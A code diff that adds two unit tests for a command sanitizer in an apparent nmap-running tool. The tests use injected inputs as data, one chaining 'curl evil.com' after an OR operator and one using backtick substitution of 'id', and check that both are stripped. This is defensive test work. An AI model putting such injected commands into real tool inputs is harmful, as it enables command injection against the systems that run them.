@@ -63,3 +63,14 @@ class TestSanitizeCommand:
         result = executor._sanitize_command(cmd)
         assert "-T3" in result
         assert result.count("-T") == 1
+
+    def test_strips_or_operator(self, executor):
+        cmd = "nmap -sS 192.168.1.1 || curl evil.com"
+        result = executor._sanitize_command(cmd)
+        assert "||" not in result
+        assert "curl" not in result
+
+    def test_strips_backtick_substitution(self, executor):
+        cmd = "nmap -sS `id`"
+        result = executor._sanitize_command(cmd)
+        assert "`" not in result
